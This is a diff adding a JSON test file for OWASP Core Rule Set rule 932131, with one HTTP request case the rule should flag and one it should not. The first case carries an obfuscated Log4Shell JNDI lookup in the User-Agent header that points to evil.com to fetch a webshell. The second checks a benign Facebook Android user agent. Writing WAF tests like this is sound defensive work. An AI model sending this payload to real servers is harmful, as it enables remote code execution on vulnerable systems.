@@ -1,0 +1,56 @@
+[
+  {
+    "name": "CRS 932131-1: Log4J test with evasion",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent ${:1337:-x$}{jndi:ldap://evil.com/webshell}"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932131
+    ]
+  },
+  {
+    "name": "CRS 932131-2: False positive against Facebook for Android user agent",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "User-Agent",
+        "mozilla/5.0(linux android 12 sm-a528b build/sp1a.210812.016 wv) applewebkit/537.36(khtml like gecko) version/4.0 chrome/110.0.5481.154 mobile safari/537.36 [fb_iab/fb4a fbav/403.0.0.27.81 ]"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      932131
+    ]
+  }
+]
